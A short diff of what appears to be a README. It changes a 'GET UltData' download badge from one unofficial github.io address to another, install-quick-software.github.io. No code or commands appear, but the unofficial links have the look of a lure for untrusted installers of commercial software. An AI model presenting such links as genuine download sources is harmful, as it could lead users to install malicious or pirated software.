@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/ultdata">  
+<a href="https://install-quick-software.github.io/.github/ultdata">  
 <img src="https://img.shields.io/badge/💻_GET_UltData-teal?style=for-the-badge&logo=apple" alt="GET UltData">  
 </a>  
 </div>
